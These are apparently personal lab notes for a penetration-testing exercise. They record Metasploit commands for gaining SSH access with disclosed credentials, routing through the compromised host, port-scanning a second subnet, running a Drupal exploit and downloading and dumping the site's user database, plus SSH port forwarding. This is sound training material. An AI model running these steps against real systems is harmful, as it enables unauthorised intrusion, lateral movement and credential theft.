# Pivot Exploitation Notes

Lab using Metasploit to compromise an accessible host then use this host to pivot

We'll reuse the disclosed SSH credentials to gain a foothold on the SSH server

```
search sshexec
use 0
set RHOSTS 172.30.0.21
set USERNAME <user>
set PASSWORD <pass>
set LHOST eth0
exploit
```

Enumerating victim, gather info if other network interfaces exist 

```
shell
ifconfig
exit
```

Establishing meterpreter route

```
background
route add 172.40.0.0 255.255.255.0 1
```

Now scan with this route added

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.40.0.3-20
set PORTS 80,443,8000,8080
```

## HTTP Recon with MSF

Info: the above scan shows one http client so now we are going to use MSF to test that port and see what's there

```
use auxiliary/scanner/http/http_header
set RHOSTS 172.40.0.10
run
```

## Drupal exploit

so from above we determined it's a drupal web server so we look for exploits and abuse one that exists in MSF

```
search type:exploit rank:excellent drupal
use 2
show info
set RHOSTS 172.40.0.10
set LHOST eth0
exploit
```

## Pillage drupal server

use meterpreter session to retrieve contents of the drupal db

```
download /var/www/html/sites/default/files/.ht.sqlite
```

dump the contents of the db

```
sqlite3 .ht.sqlite ".dump users_field_data"
```

## Using SSH

so instead of using MSF let's see how to port forward with SSH, this hosts port 8080 on the local system to point to port 80 on the target machine

```
ssh -L 8080:172.40.0.10:80 <user>@172.30.0.21
netstat -nat | grep 8080
```


